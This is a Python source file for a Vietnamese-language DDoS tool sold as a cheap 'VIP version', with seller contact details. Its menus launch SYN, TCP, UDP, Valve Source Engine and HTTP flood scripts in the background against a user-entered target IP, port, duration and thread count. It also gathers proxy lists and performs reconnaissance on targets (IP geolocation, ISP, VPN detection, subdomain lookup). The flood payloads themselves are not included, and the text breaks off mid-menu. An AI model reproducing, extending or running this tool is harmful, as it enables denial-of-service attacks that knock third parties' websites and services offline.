#!/usr/bin/env python3

from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
import os, sys,re,json,random
from time import sleep
import threading
import sys
import ssl
import datetime
import os, sys,re,json,random
from time import sleep
import threading
import json,requests,time
from time import strftime
from datetime import date

today = date.today()
sr="\033[1;31m [\033[1;92m●\033[1;31m]\033[1;97m ➺❥ \033[1;92m"
n = "\033[1;91m『\033[1;97m亗\033[1;91m』"
m = "\033[1;97m▶▶\033[1;97m"
nm = n+m+' '
d1 = today.strftime("%d/%m/%Y")
a = '\033[1;91m=\033[1;97m='*32

try: #pip3 install httpx requests speedtest colorama
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	sup):
		self.help = help
		self.sup = sup

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): # don't edit this banner lol
		print(f"""
   \033[1;90m██████\033[1;95m╗\033[1;90m ██████\033[1;95m╗ \033[1;90m███████\033[1;95m╗\033[1;90m██████\033[1;95m╗\033[1;90m ██████\033[1;95m╗ \033[1;90m ██████\033[1;95m╗\033[1;90m ███████\033[1;95m╗
   \033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗╚════\033[1;90m██\033[1;95m╗╚════\033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔═══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔════╝
   \033[1;90m██████\033[1;95m╔╝ \033[1;90m█████\033[1;95m╔╝    \033[1;90m██\033[1;95m╔╝\033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║ \033[1;90m ██\033[1;95m║\033[1;90m██\033[1;95m║   \033[1;90m██\033[1;95m║\033[1;90m███████\033[1;95m╗
   \033[1;90m██\033[1;95m╔═══╝  ╚═══\033[1;90m██\033[1;95m╗   \033[1;90m██\033[1;95m╔╝ \033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║   \033[1;90m██\033[1;95m║╚════\033[1;90m██\033[1;95m║
   \033[1;90m██\033[1;95m║     \033[1;90m██████\033[1;95m╔╝   \033[1;90m██\033[1;95m║  \033[1;90m██████\033[1;95m╔╝\033[1;90m██████\033[1;95m╔╝╚\033[1;90m██████\033[1;95m╔╝\033[1;90m███████\033[1;95m║
   \033[1;95m╚═╝     ╚═════╝    ╚═╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                           \033[1;97m P37Roy VIP Version
\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=     """)
		print(sr+"Hôm nay là ngày:\033[1;93m" ,d1)
		print(sr+"Zalo: \033[1;97m0384574058")
		print(sr+"\033[1;92mFacebook: \033[1;97mhttps://www.facebook.com/P37RoyKing")
		print(sr+"P37R DDoS Vip Version - Giá Rẻ - Chất Lượng")
		print(a)
		print()
		print(sr+"Nhập [1] Để DDoS")
		print(sr+"Nhập [2] Để Download Proxy")
		print()
		print(a)
		print()
		print(sr+"Nhập [HOME] Để Trở Về Trang Chính")
		print(sr+"Nhập [CLEAR] Để Xoá Sạch Và Làm Mới")
		print(sr+"Nhập [SUP] Để Liên Hệ Support")
		print()
		print(a)
		print("\n")
		while True:
			try:
				sys.stdout.write(nm+"Nhập: ")
				option = input()
				if option == '02' or option == '2':
					os.system('clear')
					Tool.proxy(option)
				elif option == '16' or option == '16':
					os.system('clear')
					Tool.webtools()
				elif option  == '01' or option == '1':
					os.system('clear')
					Tool.bbos()
				elif option == '2006' or option == '2006':
					os.system('clear')
					Tool.spdtest()
				elif option == 'refcc' or option == 'REFCC':
					self.home()
				elif option == 'home' or option == 'HOME':
					self.home()
				elif option == 'clear' or option == 'CLEAR':
					os.system('clear')
					PBT_Tool.home() 
				elif option == 'hello' or option == 'HELP':
					print(self.help)
				elif option == 'sup' or option == 'SUP':
					print(self.sup)
				elif option == 'exit' or option == 'EXIT':
					subprocess.run(['pkill -f P37Vip.py'], shell=True)
				elif option == 'stop' or option == 'STOP':
					subprocess.run(['pkill screen'], shell=True)
					print(sr+"\033[1;91mP37DDoS stop attack!")
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
			except KeyboardInterrupt:
				sys.exit(0)


class response_url:
	def __init__(self,
	headers):
		self.headers = headers

	def lookup(self, url):
		try:
			if url == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
			info = Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']

			if resp['status'] == 'success':
				return info
			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def ip_lookup(self, ip):
		try:
			if ip == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()

			info = Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])

			if resp['status'] == 'success':
				return info

		except KeyError:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def http_status(self, url):
		try:
			parser = parse.urlparse(url)
			if parser.scheme == "":
				url = "http://"+url
			resp = httpx.get(url, headers=self.headers)
			status = resp.status_code
			if status == 200:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (OK)"
			elif status == 301:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Moved Permanently)"
			elif status == 302:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Found)"
			elif status == 303:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (See Other)"
			elif status == 307:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Temporary Redirect)"
			elif status == 400:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Unauthorized)"
			elif status == 410:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Gone)"
			elif status == 401:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Bad Requests)"
			elif status == 403:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Forbidden)"
			elif status == 404:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Not Found)"
			elif status == 429:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (To Many Requests)"
			elif status == 500:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Internal Server Error)"
			elif status == 502:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Bad Gateway)"
			elif status == 503:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Service Unavailable)"
			elif status == 504:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Gateway Timeout)"
			elif status == 507:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Insufficient Storage)"
			elif status == 508:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Loop Detected)"
			else:
				return Color.LR+f"    [+] Result: (Connection timeout)"

		except httpx.TimeoutException:
			return Color.LR+f"     [+] Result: (Connection timeout)"
		except httpx.ConnectError:
			return Color.LR+f"    [+] Result: Error occurred"
		except httpx.UnsupportedProtocol:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"

	def findhost(self, host):
		try:
			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)

			info = resp.text
			if info == 'error invalid host':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			else:
				return Color.LG+info
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def extractlink(self, url):
		try:
			resp = requests.get(f"https://api.hackertarget.com/pagelinks/?q={url}", headers=self.headers)

			info = resp.text
			if info == "input url is invalid":
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			elif info == "error getting links":
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" No Links Found!"
			else:
				return Color.LG+info
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."


class Tool:
	def __init__(self,
	help,
	sup,
	headers):
		self.help = help
		self.sup = sup
		self.headers = headers

	def proxy(self, new):
		try:
			with open("p37r/url.json", 'r') as p:
				read_url = p.read()
				readjson = json.loads(read_url)
		except FileNotFoundError:
			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'p37r' NotFound")
		if new == 'ref' or new == 'REF' or new == 'clear' or new == 'CLEAR':
			os.system('clear')
			PBT_Tool.styleText("""   
██████╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
██╔══██╗╚════██╗╚════██║    ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
██████╔╝ █████╔╝    ██╔╝    ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ 
██╔═══╝  ╚═══██╗   ██╔╝     ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  
██║     ██████╔╝   ██║      ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   
╚═╝     ╚═════╝    ╚═╝      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   

[×] Đang Cập Nhật Proxy....""")
		else:
			PBT_Tool.styleText("""  
██████╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
██╔══██╗╚════██╗╚════██║    ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
██████╔╝ █████╔╝    ██╔╝    ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ 
██╔═══╝  ╚═══██╗   ██╔╝     ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  
██║     ██████╔╝   ██║      ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   
╚═╝     ╚═════╝    ╚═╝      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝                                   
                                          
[×] Đang Tải Xuống Proxy...""")
		try:
			http  = requests.get(readjson['Proxies'][0]['url'], headers=self.headers).text
			http += requests.get(readjson['Proxies'][1]['url'], headers=self.headers).text
			http += requests.get(readjson['Proxies'][2]['url'], headers=self.headers).text
			http += requests.get(readjson['Proxies'][3]['url'], headers=self.headers).text
			https = requests.get(readjson['Proxies'][4]['url'], headers=self.headers).text
			https += requests.get(readjson['Proxies'][5]['url'], headers=self.headers).text
			https += requests.get(readjson['Proxies'][6]['url'], headers=self.headers).text
			https +=  requests.get(readjson['Proxies'][7]['url'], headers=self.headers).text
			socks4  = requests.get(readjson['Proxies'][8]['url'], headers=self.headers).text
			socks4 += requests.get(readjson['Proxies'][9]['url'], headers=self.headers).text
			socks4 += requests.get(readjson['Proxies'][10]['url'], headers=self.headers).text
			socks4 += requests.get(readjson['Proxies'][11]['url'], headers=self.headers).text
			socks5 = requests.get(readjson['Proxies'][12]['url'], headers=self.headers).text
			socks5 += requests.get(readjson['Proxies'][13]['url'], headers=self.headers).text
			socks5 += requests.get(readjson['Proxies'][14]['url'], headers=self.headers).text
			socks5 += requests.get(readjson['Proxies'][15]['url'], headers=self.headers).text
			os.system('clear')
		except requests.exceptions.ConnectionError:
			sys.exit(Color.LR+"Error: Check your Internet Connection.")

		print(f"""{Color.LG}




""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" PROXY 1")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" PROXY 2")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" SOCKS4 PROXY")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
		print("\n")
		while True:
				sys.stdout.write(nm+"Nhập: ")
				option = input()
				if option == '01' or option == '1':
					with open("http.txt", 'w') as p:
						p.write(http)
					print(sr+"Tải thành công proxy 1")
				elif option == '02' or option == '2':
					with open("https.txt", 'w') as p:
						p.write(https)
					print(sr+"Tải thành công proxy 2")
				elif option == '03' or option == '3':
					with open("socks4.txt", 'w') as p:
						p.write(socks4)
					print(sr+"Tải thành công socks4")
				elif option == '04' or option == '4':
					with open("socks5.txt", 'w') as p:
						p.write(socks5)
					print(sr+"Tải thành công socks5")
				elif option == 'ref' or option == 'REF':
					self.proxy(option)
				elif option == 'home' or option == 'HOME':
					PBT_Tool.home()
				elif option == 'clear' or option == 'CLEAR':
					os.system('clear')
					self.proxy(option)
				elif option == 'hello' or option == 'HELLO':
					print(self.help)
				elif option == 'sup' or option == 'SUP':
					print(self.sup)
				elif option == 'exit' or option == 'EXIT':
					subprocess.run(['pkill -f P37Vip.py'], shell=True)
				elif option == 'stop' or option == 'STOP':
					subprocess.run(['pkill screen'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def webtools(self):
		print(f"""{Color.LG}

   

""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" LOOKUP")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" IP INFO")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP STATUS")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" FIND HOST")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
		print("\n")
		while True:
			sys.stdout.write(nm+"Nhập: ")
			option = input()
			if option == '01' or option == '1':
				while True:
					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = parse.urlparse(url)
						host = parser.netloc
					print(response_url(self.headers).lookup(host))
					break
			elif option == '02' or option == '2':
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
					print(response_url(self.headers).ip_lookup(ip_lookup))
					break
			elif option == '03' or option == '3':
				while True:
					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).http_status(http))
					break
			elif option == '04' or option == '4':
				while True:
					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url(self.headers).findhost(host))
					elif host == '':
						print(response_url(self.headers).findhost(path))
					break
			elif option == '05' or option == '5':
				while True:
					excractlink = input(Color.LR+"["+Color.LG+"EXCRACTLINK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).extractlink(excractlink))
					break
			elif option == 'ref' or option == 'REF':
				self.webtools()
			elif option == 'home' or option == 'HOME':
				PBT_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.webtools()
			elif option == 'hello' or option == 'HELLO':
				print(self.help)
			elif option == 'sup' or option == 'SUP':
				print(self.sup)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f P37Vip.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def spdtest(self):
		print(f"""{Color.LG}

   


""")
		try:
			spdt = speedtest.Speedtest()

			print(Color.LC+"[*] Loading Server List...")
			spdt.get_servers()
			time.sleep(0.1)

			print(Color.LC+"[*] Choosing Best Server...")
			get = spdt.get_best_server()
			time.sleep(0.1)

			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")

			print(Color.LC+"\n[*] Performing Download Test...")
			download_result = spdt.download()

			print(Color.LC+"[*] Performing Upload Test...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping

			time.sleep(0.1)
			print(Color.LC+"\nResults:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Error: Check your Internet Connection.\n\n")


	def bbos(self):
		print("""
   \033[1;90m██████\033[1;95m╗\033[1;90m ██████\033[1;95m╗ \033[1;90m███████\033[1;95m╗\033[1;90m██████\033[1;95m╗\033[1;90m ██████\033[1;95m╗ \033[1;90m ██████\033[1;95m╗\033[1;90m ███████\033[1;95m╗
   \033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗╚════\033[1;90m██\033[1;95m╗╚════\033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔═══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔════╝
   \033[1;90m██████\033[1;95m╔╝ \033[1;90m█████\033[1;95m╔╝    \033[1;90m██\033[1;95m╔╝\033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║ \033[1;90m ██\033[1;95m║\033[1;90m██\033[1;95m║   \033[1;90m██\033[1;95m║\033[1;90m███████\033[1;95m╗
   \033[1;90m██\033[1;95m╔═══╝  ╚═══\033[1;90m██\033[1;95m╗   \033[1;90m██\033[1;95m╔╝ \033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║   \033[1;90m██\033[1;95m║╚════\033[1;90m██\033[1;95m║
   \033[1;90m██\033[1;95m║     \033[1;90m██████\033[1;95m╔╝   \033[1;90m██\033[1;95m║  \033[1;90m██████\033[1;95m╔╝\033[1;90m██████\033[1;95m╔╝╚\033[1;90m██████\033[1;95m╔╝\033[1;90m███████\033[1;95m║
   \033[1;95m╚═╝     ╚═════╝    ╚═╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                           \033[1;97m P37Roy VIP Version         """)
		print(a)
		print()
		print(sr+"Nhập [1] DDoS Layer 7")
		print(sr+"Nhập [2] DDoS Layer 4")
		print("\n")
		while True:
			sys.stdout.write(nm+"Nhập: ")
			option = input()
			if option == '01' or option == '1':
				os.system('clear');self.l7()
			elif option == 'ref' or option == 'REF':
				self.bbos()
			elif option == 'home' or option == 'HOME':
				PBT_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.bbos()
			elif option == 'hello' or option == 'HELLO':
				print(self.help)
			elif option == 'sup' or option == 'SUP':
				print(self.sup)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f P37Vip.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l4(self):
		print(f"""{Color.LG}
     
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(nm+"Nhập: ")
			option = input()
			if option == '01' or option == '1':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 p37r/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 p37r/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 p37r/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '04' or option == '4':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 p37r/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '05' or option == '5':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 p37r/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
